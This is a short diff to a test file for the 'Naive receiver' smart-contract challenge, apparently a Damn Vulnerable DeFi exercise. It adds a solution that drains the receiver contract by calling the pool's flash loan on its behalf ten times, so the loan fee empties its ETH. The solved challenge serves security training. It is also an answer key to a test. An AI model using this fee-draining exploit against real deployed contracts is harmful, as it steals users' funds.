@@ -37,7 +37,19 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // The onReceive function checks for the caller being pool
+        // pool doesn't have any reentrancy guard
+        // but an even simpler solution is leverage the presence of FEE to drain the receiver by repeteadly calling the loan on it
+        // Ask a loan a 10 times
+        const ETH = await pool.ETH();
+        playerLender = pool.connect(player);
+
+        for (let i = 0; i < 10; i++) {
+            await playerLender.flashLoan(receiver.address, ETH, 1, "0x");
+        }
+        console.log(await ethers.provider.getBalance(receiver.address));
+
+        
     });
 
     after(async function () {
